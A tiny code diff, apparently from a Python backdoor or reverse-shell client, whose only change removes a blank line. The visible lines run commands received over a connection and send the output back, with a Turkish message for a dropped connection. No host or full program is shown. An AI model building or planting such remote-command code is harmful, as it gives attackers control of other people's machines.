@@ -60,7 +60,6 @@ class ihsanbey:
             else:
                 try:
                     resultt = self.execute_command(command.encode("utf-8"))
-
                     self.reliable_send(resultt.decode("utf-8"))
                 except BrokenPipeError:
                     print("Karşı Taraftaki Bağlantı kesildi")
